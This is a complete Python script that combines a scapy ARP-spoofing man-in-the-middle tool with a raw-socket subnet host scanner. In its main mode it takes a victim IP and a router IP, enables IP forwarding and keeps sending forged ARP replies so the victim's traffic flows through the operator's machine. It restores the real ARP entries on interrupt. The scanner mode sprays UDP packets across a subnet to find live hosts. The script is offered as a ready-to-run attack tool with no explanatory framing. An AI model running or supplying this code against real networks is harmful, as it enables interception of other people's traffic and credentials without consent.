#!/usr/bin/python
from scapy.all import *
import argparse
import signal
import sys
import logging
import time
import socket
import os
import struct
import threading

from netaddr import IPNetwork,IPAddress
from ctypes import *

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victimIP", help="Choose the victim IP address. Example: -v 192.168.0.5")
    parser.add_argument("-r", "--routerIP", help="Choose the router IP address. Example: -r 192.168.0.1")
    parser.add_argument("-t", "--time", help="Set sleep time for poisoning. Example: -t 1.5", type=float, default=1)
    parser.add_argument("-s", "--scan", help="Scan for Host Up. Example: -s", action="store_true", default=0)
    parser.add_argument("host", metavar="H", nargs="?", default="192.168.1.15", help="Host IP. Example: 192.168.1.15")
    parser.add_argument("subnet", metavar="S", nargs="?", default="192.168.1.0/24", help="Subnet Range. Example: 192.168.1.0/24")
    return parser.parse_args()
def originalMAC(ip):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=10)
    for s,r in responses:
        return r[Ether].src
    return None
def poison(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
def restore(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
    sys.exit("losing...")
def main(args):
    if args.scan:
        
        # host to listen on
        host   = str(args.host)
        
        # subnet to target
        subnet = str(args.subnet)
        
        # magic we'll check ICMP responses for
        magic_message = "PYTHONRULES!"
        
        def udp_sender(subnet,magic_message):
            sender = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            for ip in IPNetwork(subnet):
                try:
                    sender.sendto(magic_message,("%s" % ip,65212))
                except:
                    pass
                
                        
        class IP(Structure):
            
            _fields_ = [
                ("ihl",           c_ubyte, 4),
                ("version",       c_ubyte, 4),
                ("tos",           c_ubyte),
                ("len",           c_ushort),
                ("id",            c_ushort),
                ("offset",        c_ushort),
                ("ttl",           c_ubyte),
                ("protocol_num",  c_ubyte),
                ("sum",           c_ushort),
                ("src",           c_ulong),
                ("dst",           c_ulong)
            ]
            
            def __new__(self, socket_buffer=None):
                    return self.from_buffer_copy(socket_buffer)    
                
            def __init__(self, socket_buffer=None):
        
                # map protocol constants to their names
                self.protocol_map = {1:"ICMP", 6:"TCP", 17:"UDP"}
                
                # human readable IP addresses
                self.src_address = socket.inet_ntoa(struct.pack("<L",self.src))
                self.dst_address = socket.inet_ntoa(struct.pack("<L",self.dst))
            
                # human readable protocol
                try:
                    self.protocol = self.protocol_map[self.protocol_num]
                except:
                    self.protocol = str(self.protocol_num)
                    
        
        
        class ICMP(Structure):
            
            _fields_ = [
                ("type",         c_ubyte),
                ("code",         c_ubyte),
                ("checksum",     c_ushort),
                ("unused",       c_ushort),
                ("next_hop_mtu", c_ushort)
                ]
            
            def __new__(self, socket_buffer):
                return self.from_buffer_copy(socket_buffer)    
        
            def __init__(self, socket_buffer):
                pass
        
        # create a raw socket and bind it to the public interface
        if os.name == "nt":
            socket_protocol = socket.IPPROTO_IP 
        else:
            socket_protocol = socket.IPPROTO_ICMP
            
        sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)
        
        sniffer.bind((host, 0))
        
        # we want the IP headers included in the capture
        sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        # if we're on Windows we need to send some ioctls
        # to setup promiscuous mode
        if os.name == "nt":
            sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
        
        
        # start sending packets
        t = threading.Thread(target=udp_sender,args=(subnet,magic_message))
        t.start()        
        
        try:
            while True:
                
                # read in a single packet
                raw_buffer = sniffer.recvfrom(65565)[0]
                
                # create an IP header from the first 20 bytes of the buffer
                ip_header = IP(raw_buffer[0:20])
              
                #print "Protocol: %s %s -> %s" % (ip_header.protocol, ip_header.src_address, ip_header.dst_address)
            
                # if it's ICMP we want it
                if ip_header.protocol == "ICMP":
                    
                    # calculate where our ICMP packet starts
                    offset = ip_header.ihl * 4
                    buf = raw_buffer[offset:offset + sizeof(ICMP)]
                    
                    # create our ICMP structure
                    icmp_header = ICMP(buf)
                    
                    #print "ICMP -> Type: %d Code: %d" % (icmp_header.type, icmp_header.code)
        
                    # now check for the TYPE 3 and CODE 3 which indicates
                    # a host is up but no port available to talk to           
                    if icmp_header.code == 3 and icmp_header.type == 3:
                        
                        # check to make sure we are receiving the response 
                        # that lands in our subnet
                        if IPAddress(ip_header.src_address) in IPNetwork(subnet):
                            
                            # test for our magic message
                            if raw_buffer[len(raw_buffer)-len(magic_message):] == magic_message:
                                print "Host Up: %s" % ip_header.src_address
        # handle CTRL-C
        except KeyboardInterrupt:
            # if we're on Windows turn off promiscuous mode
            if os.name == "nt":
                sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
        
        
        
    else:    
        if os.geteuid() != 0:
            sys.exit("[!] Please run as root")
        routerIP = args.routerIP
        victimIP = args.victimIP
        routerMAC = originalMAC(args.routerIP)
        victimMAC = originalMAC(args.victimIP)
        if routerMAC == None:
            sys.exit("Could not find router MAC address. Closing....")
        if victimMAC == None:
            sys.exit("Could not find victim MAC address. Closing....")
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
            ipf.write('1\n')
        def signal_handler(signal, frame):
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
                ipf.write('0\n')
            restore(routerIP, victimIP, routerMAC, victimMAC)
        signal.signal(signal.SIGINT, signal_handler)
        while 1:
            poison(routerIP, victimIP, routerMAC, victimMAC)
            time.sleep(args.time)
main(parse_args())
